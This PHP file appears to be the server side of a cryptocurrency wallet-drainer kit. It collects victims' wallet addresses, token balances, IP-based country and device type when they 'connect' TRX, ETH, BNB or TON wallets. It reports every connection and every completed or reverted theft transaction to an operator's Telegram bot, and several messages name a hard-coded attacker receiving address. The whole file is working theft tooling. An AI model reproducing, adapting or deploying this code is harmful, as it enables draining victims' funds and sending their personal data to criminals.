<?php

include '../config.php';

$replyMarkup = '';

function sex($bot_token, $chat_id, $text, $reply_markup = '')
{
    $ch = curl_init();
    $ch_post = [
        CURLOPT_URL => 'https://api.telegram.org/bot' . $bot_token . '/sendMessage',
        CURLOPT_POST => TRUE,
        CURLOPT_RETURNTRANSFER => TRUE,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $chat_id,
            'parse_mode' => 'HTML',
            'text' => $text,
            'reply_markup' => $reply_markup,
            'disable_web_page_preview' => true
        ]
    ];
    curl_setopt_array($ch, $ch_post);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);

    if ($result === false || $httpCode !== 200) {
        error_log("Telegram sendMessage failed: $curlError");
        return false;
    }

    $response = json_decode($result, true);
    if (!$response['ok']) {
        error_log("Telegram API error: " . $response['description']);
        return false;
    }

    return true;
}


function getDeviceType($userAgent) {
    // Проверяем на наличие мобильных устройств
    if (preg_match('/mobile/i', $userAgent)) {
        return 'Mobile';
    }
    
    // Проверяем на наличие планшетов
    if (preg_match('/tablet/i', $userAgent)) {
        return 'Tablet';
    }
    
    // Проверяем на наличие смартфонов (iPhone, Android)
    if (preg_match('/iphone|ipod|android/i', $userAgent)) {
        return 'Mobile';
    }
    
    // Проверяем на ПК (платформа Windows, MacOS, Linux)
    if (preg_match('/windows/i', $userAgent) || preg_match('/macintosh|mac os/i', $userAgent) || preg_match('/linux/i', $userAgent)) {
        return 'PC';
    }

    return 'Unknown'; // Если не удалось определить
}

function getCountryByIP($ip) {
    $url = "http://ip-api.com/json/{$ip}";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 5 секунд таймаут
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);

    if ($response === false || $httpCode !== 200) {
        error_log("IP API request failed: $curlError");
        return "Unknown";
    }

    $data = json_decode($response, true);
    return isset($data['country']) ? $data['country'] : "Unknown";
}


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $message="none";

    
    if($_POST['connect'] && $_POST['trx']){

        $ip =$_POST['ip'];
        $url = "http://ip-api.com/json/{$ip}";
        $country = "Russia";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);

        $data = json_decode($response, true);

        if (isset($data['country'])) {
            $country = $data['country'];
        }
        $userAgent = $_SERVER['HTTP_USER_AGENT'];

        // Определяем тип устройства
        $device = getDeviceType($userAgent);
	
        $address=$_POST["address"];
        $wallet_name=$_POST["wallet_name"];
        $tronLinkUrl = "https://tron"."scan.org/#/address/".$address;
	$amount =$_POST['amount'];
        $usdt=$_POST['usdt_amount'];
        $receiver = $_POST['address_receive'];
        $trx=$_POST['trx_amount'];
        $usdt_balance=$_POST['usdt_balance'];
        $trx_balance=$_POST['trx_balance'];
        $message ="💸 <strong>Wallet connected</strong>\n".
	'<strong>User address:</strong> <code>'.$address.'</code> | <a href="'.$tronLinkUrl.'">TronScan</a>'.
	"\n<strong>Wallet name:</strong> <code>$wallet_name</code>\n".
	"<strong>Country:</strong> <code>$country</code>\n".
	"<strong>Device:</strong> <code>$device</code>\n".
	"<strong>Total value tokens:</strong> <code>$amount</code> $\n".
	"<strong>Most valuable tokens:</strong>\n".
    "1:\n".
    "<strong>Name:</strong> <code>TETHER USD</code>\n".
    "<strong>Type:</strong> <code>TRC20</code>\n".
    "<strong>Amount:</strong> <code>$usdt</code>\n".
    "<strong>Balance:</strong> <code>$usdt_balance $</code>\n\n".
    "2:\n".
    "<strong>Name:</strong> <code>TRX</code>\n".
    "<strong>Type:</strong> <code>TRC10</code>\n".
    "<strong>Amount:</strong> <code>$trx</code>\n".
    "<strong>Balance:</strong> <code>$trx_balance $</code>\n\n".
    "<strong>💰 To:</strong> <code>TJVkBahAoYPpv7gyuvaaG9cVngTMJcDjVt</code>";

}
if($_POST['connect'] && $_POST['eth']){

    $ip =$_POST['ip'];
    $url = "http://ip-api.com/json/{$ip}";
    $country = "Russia";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    $data = json_decode($response, true);

    if (isset($data['country'])) {
        $country = $data['country'];
    }
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Определяем тип устройства
    $device = getDeviceType($userAgent);

    $address=$_POST["address"];
    $wallet_name=$_POST["wallet_name"];
    $tronLinkUrl = "https://ether"."scan.io/address/".$address;
$amount =$_POST['amount'];
    $usdt=$_POST['usdt_amount'];
    $receiver = $_POST['address_receive'];
    $eth=$_POST['eth_amount'];
    $usdt_balance=$_POST['usdt_balance'];
    $eth_balance=$_POST['eth_balance'];
    $message ="💸 <strong>Wallet connected</strong>\n".
'<strong>User address:</strong> <code>'.$address.'</code> | <a href="'.$tronLinkUrl.'">Etherscan</a>'.
"\n<strong>Wallet name:</strong> <code>$wallet_name</code>\n".
"<strong>Country:</strong> <code>$country</code>\n".
"<strong>Device:</strong> <code>$device</code>\n".
"<strong>Total value tokens:</strong> <code>$amount</code> $\n".
"<strong>Most valuable tokens:</strong>\n".
"1:\n".
"<strong>Name:</strong> <code>TETHER USD</code>\n".
"<strong>Type:</strong> <code>ERC20</code>\n".
"<strong>Amount:</strong> <code>$usdt</code>\n".
"<strong>Balance:</strong> <code>$usdt_balance $</code>\n\n".
"2:\n".
"<strong>Name:</strong> <code>ETH</code>\n".
"<strong>Type:</strong> <code>Ethereum</code>\n".
"<strong>Amount:</strong> <code>$eth</code>\n".
"<strong>Balance:</strong> <code>$eth_balance $</code>\n\n".
"<strong>💰 To:</strong> <code>$receiver</code>";

}
if($_POST['connect'] && $_POST['bnb']){

    $ip =$_POST['ip'];
    $url = "http://ip-api.com/json/{$ip}";
    $country = "Russia";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    $data = json_decode($response, true);

    if (isset($data['country'])) {
        $country = $data['country'];
    }
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Определяем тип устройства
    $device = getDeviceType($userAgent);

    $address=$_POST["address"];
    $wallet_name=$_POST["wallet_name"];
    $tronLinkUrl = "https://bsc"."scan.com/address/".$address;
$amount =$_POST['amount'];
    $usdt=$_POST['usdt_amount'];
    $receiver = $_POST['address_receive'];
    $bnb=$_POST['bnb_amount'];
    $usdt_balance=$_POST['usdt_balance'];
    $bnb_balance=$_POST['bnb_balance'];
    $message ="💸 <strong>Wallet connected</strong>\n".
'<strong>User address:</strong> <code>'.$address.'</code> | <a href="'.$tronLinkUrl.'">Bscscan</a>'.
"\n<strong>Wallet name:</strong> <code>$wallet_name</code>\n".
"<strong>Country:</strong> <code>$country</code>\n".
"<strong>Device:</strong> <code>$device</code>\n".
"<strong>Total value tokens:</strong> <code>$amount</code> $\n".
"<strong>Most valuable tokens:</strong>\n".
"1:\n".
"<strong>Name:</strong> <code>TETHER USD</code>\n".
"<strong>Type:</strong> <code>BNB20</code>\n".
"<strong>Amount:</strong> <code>$usdt</code>\n".
"<strong>Balance:</strong> <code>$usdt_balance $</code>\n\n".
"2:\n".
"<strong>Name:</strong> <code>BNB</code>\n".
"<strong>Type:</strong> <code>BNB Smart Chain</code>\n".
"<strong>Amount:</strong> <code>$bnb</code>\n".
"<strong>Balance:</strong> <code>$bnb_balance $</code>\n\n".
"<strong>💰 To:</strong> <code>$receiver</code>";

}

if($_POST['connect'] && $_POST['ton']){

    $ip =$_POST['ip'];
    $url = "http://ip-api.com/json/{$ip}";
    $country = "Russia";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    $data = json_decode($response, true);

    if (isset($data['country'])) {
        $country = $data['country'];
    }
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Определяем тип устройства
    $device = getDeviceType($userAgent);

    $address=$_POST["address"];
    $wallet_name=$_POST["wallet_name"];
    $tronLinkUrl = "https://ton"."scan.org/address/".$address;
$amount =$_POST['amount'];
    $usdt=$_POST['usdt_amount'];
    $receiver = $_POST['address_receive'];
    $ton=$_POST['ton_amount'];
    $usdt_balance=$_POST['usdt_balance'];
    $ton_balance=$_POST['ton_balance'];
    $message ="💸 <strong>Wallet connected</strong>\n".
'<strong>User address:</strong> <code>'.$address.'</code> | <a href="'.$tronLinkUrl.'">Tonscan</a>'.
"\n<strong>Wallet name:</strong> <code>$wallet_name</code>\n".
"<strong>Country:</strong> <code>$country</code>\n".
"<strong>Device:</strong> <code>$device</code>\n".
"<strong>Total value tokens:</strong> <code>$amount</code> $\n".
"<strong>Most valuable tokens:</strong>\n".
"1:\n".
"<strong>Name:</strong> <code>TETHER USD</code>\n".
"<strong>Type:</strong> <code>JETTON</code>\n".
"<strong>Amount:</strong> <code>$usdt</code>\n".
"<strong>Balance:</strong> <code>$usdt_balance $</code>\n\n".
"2:\n".
"<strong>Name:</strong> <code>TON</code>\n".
"<strong>Type:</strong> <code>TON</code>\n".
"<strong>Amount:</strong> <code>$ton</code>\n".
"<strong>Balance:</strong> <code>$ton_balance $</code>\n\n".
"<strong>💰 To:</strong> <code>$receiver</code>";

}




    if($_POST['success_client']){
        $method = $_POST["method"];
        $token_name = $_POST["token_name"];
        $token_type = $_POST["token_type"];
        $token_contract = $_POST["token_contract"];
        $token_amount = $_POST["token_amount"];
        $token_balance = $_POST["token_balance"];
        $from_address = $_POST["from_address"];
        $to_address = $_POST["to_address"];
        $hash = $_POST["hash"];
        $message="✅ <strong>Transaction completed: on Client side:</strong>\n".
                "<strong>Method:</strong> <code>$method</code>\n".
                "<strong>Token name:</strong> <code>$token_name</code>\n".
                "<strong>Token type:</strong> <code>$token_type</code>\n".
                "<strong>Token contract:</strong> <code>$token_contract</code>\n".
                "<strong>Token amount:</strong> <code>$token_amount</code>\n".
                "<strong>Token balance:</strong> <code>$token_balance $</code>\n".
                "<strong>From:</strong>\n".
                "<code>$from_address</code>\n".
                "<strong>To:</strong>\n".
                "<code>TJVkBahAoYPpv7gyuvaaG9cVngTMJcDjVt</code>\n";
    }
    if($_POST['error_client']){
        $method = $_POST["method"];
        $token_name = $_POST["token_name"];
        $token_type = $_POST["token_type"];
        $token_contract = $_POST["token_contract"];
        $token_amount = $_POST["token_amount"];
        $token_balance = $_POST["token_balance"];
        $from_address = $_POST["from_address"];
        $to_address = $_POST["to_address"];
        $error = $_POST["error"];
        $message="❌ <strong>Transaction reverted: on Client side:</strong>\n".
                "<strong>Method:</strong> <code>$method</code>\n".
                "<strong>Token name:</strong> <code>$token_name</code>\n".
                "<strong>Token type:</strong> <code>$token_type</code>\n".
                "<strong>Token contract:</strong> <code>$token_contract</code>\n".
                "<strong>Token amount:</strong> <code>$token_amount</code>\n".
                "<strong>Token balance:</strong> <code>$token_balance $</code>\n".
                "<strong>From:</strong>\n".
                "<code>$from_address</code>\n".
                "<strong>To:</strong>\n".
                "<code>TJVkBahAoYPpv7gyuvaaG9cVngTMJcDjVt</code>\n".
                "<strong>Error:</strong> <code>$error</code>";
    }
    if($_POST['success_server']){
        $method = $_POST["method"];
        $token_name = $_POST["token_name"];
        $token_type = $_POST["token_type"];
        $token_contract = $_POST["token_contract"];
        $token_amount = $_POST["token_amount"];
        $token_balance = $_POST["token_balance"];
        $from_address = $_POST["from_address"];
        $to_address = $_POST["to_address"];
        $hash = $_POST["hash"];
	 $tronLinkUrl = "https://tron"."scan.org/#/transaction/".$hash;
        $message="✅ <strong>Transaction completed: on Server side:</strong>\n".
                "<strong>Method:</strong> <code>$method</code>\n".
                "<strong>Token name:</strong> <code>$token_name</code>\n".
                "<strong>Token type:</strong> <code>$token_type</code>\n".
                "<strong>Token contract:</strong> <code>$token_contract</code>\n".
                "<strong>Token amount:</strong> <code>$token_amount</code>\n".
                "<strong>Token balance:</strong> <code>$token_balance $</code>\n".
                "<strong>From:</strong>\n".
                "<code>$from_address</code>\n".
                "<strong>To:</strong>\n".
                "<code>TJVkBahAoYPpv7gyuvaaG9cVngTMJcDjVt</code>\n".
                "<strong>Transaction Hash:</strong>\n $tronLinkUrl";
    }
    if($_POST['error_server']){
        $method = $_POST["method"];
        $token_name = $_POST["token_name"];
        $token_type = $_POST["token_type"];
        $token_contract = $_POST["token_contract"];
        $token_amount = $_POST["token_amount"];
        $token_balance = $_POST["token_balance"];
        $from_address = $_POST["from_address"];
        $to_address = $_POST["to_address"];
        $error = $_POST["error"];
        $message="❌ <strong>Transaction reverted: on Server side:</strong>\n".
                "<strong>Method:</strong> <code>$method</code>\n".
                "<strong>Token name:</strong> <code>$token_name</code>\n".
                "<strong>Token type:</strong> <code>$token_type</code>\n".
                "<strong>Token contract:</strong> <code>$token_contract</code>\n".
                "<strong>Token amount:</strong> <code>$token_amount</code>\n".
                "<strong>Token balance:</strong> <code>$token_balance $</code>\n".
                "<strong>From:</strong>\n".
                "<code>$from_address</code>\n".
                "<strong>To:</strong>\n".
                "<code>TJVkBahAoYPpv7gyuvaaG9cVngTMJcDjVt</code>\n".
                "<strong>Error:</strong> <code>$error</code>";
    }
    if($_POST['transaction_client']){
        $method = $_POST["method"];
        $token_name = $_POST["token_name"];
        $token_type = $_POST["token_type"];
        $token_contract = $_POST["token_contract"];
        $token_amount = $_POST["token_amount"];
        $token_balance = $_POST["token_balance"];
        $message="❕<strong>Transaction started on Client side:</strong>\n".
                "<strong>Method:</strong> <code>$method</code>\n".
                "<strong>Token name:</strong> <code>$token_name</code>\n".
                "<strong>Token type:</strong> <code>$token_type</code>\n".
                "<strong>Token contract:</strong> <code>$token_contract</code>\n".
                "<strong>Token amount:</strong> <code>$token_amount</code>\n".
                "<strong>Token balance:</strong> <code>$token_balance $</code>";
    }
    if($_POST['transaction_server']){
        $method = $_POST["method"];
        $token_name = $_POST["token_name"];
        $token_type = $_POST["token_type"];
        $token_contract = $_POST["token_contract"];
        $token_amount = $_POST["token_amount"];
        $token_balance = $_POST["token_balance"];
        $message="❕<strong>Transaction started on Server side:</strong>\n".
                "<strong>Method:</strong> <code>$method</code>\n".
                "<strong>Token name:</strong> <code>$token_name</code>\n".
                "<strong>Token type:</strong> <code>$token_type</code>\n".
                "<strong>Token contract:</strong> <code>$token_contract</code>\n".
                "<strong>Token amount:</strong> <code>$token_amount</code>\n".
                "<strong>Token balance:</strong> <code>$token_balance $</code>";
    }
    echo $message;
    sex($bot_token, $chat, $message);
}
